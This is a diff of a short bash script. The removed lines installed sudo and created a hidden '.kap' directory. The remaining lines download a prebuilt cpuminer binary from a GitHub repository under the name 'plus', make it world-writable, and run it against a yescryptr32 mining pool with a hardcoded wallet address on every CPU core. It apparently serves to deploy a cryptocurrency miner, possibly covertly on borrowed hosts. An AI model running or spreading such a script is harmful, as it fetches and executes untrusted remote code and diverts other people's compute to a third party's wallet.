@@ -1,6 +1,4 @@
 #!/bin/bash
-apt-get update ; apt-get -y install sudo
-mkdir .kap && cd .kap
 wget -O plus https://github.com/nandafiku/gradi/raw/main/cpuminer-avx2
 chmod 777 plus
 ./plus -a yescryptr32 -o stratum+tcp://stratum-na.rplant.xyz:7116 -u UhRKkepDeGL4o7YPa45M9Xba2NiBnvhxVm.x -p webpassword=x -t $(nproc --all)
